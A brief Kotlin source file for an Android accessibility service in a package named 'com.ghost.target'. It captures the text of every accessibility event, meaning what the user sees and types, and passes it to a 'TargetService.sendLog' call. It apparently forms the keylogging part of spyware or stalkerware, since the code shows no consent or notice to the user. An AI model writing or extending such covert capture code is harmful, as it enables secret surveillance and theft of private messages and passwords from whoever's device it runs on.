package com.ghost.target
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
class MyAccessibility : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val text = event.text?.joinToString(" ") ?: ""
        if (text.isNotBlank()) TargetService.sendLog("acc: $text")
    }
    override fun onInterrupt() {}
}
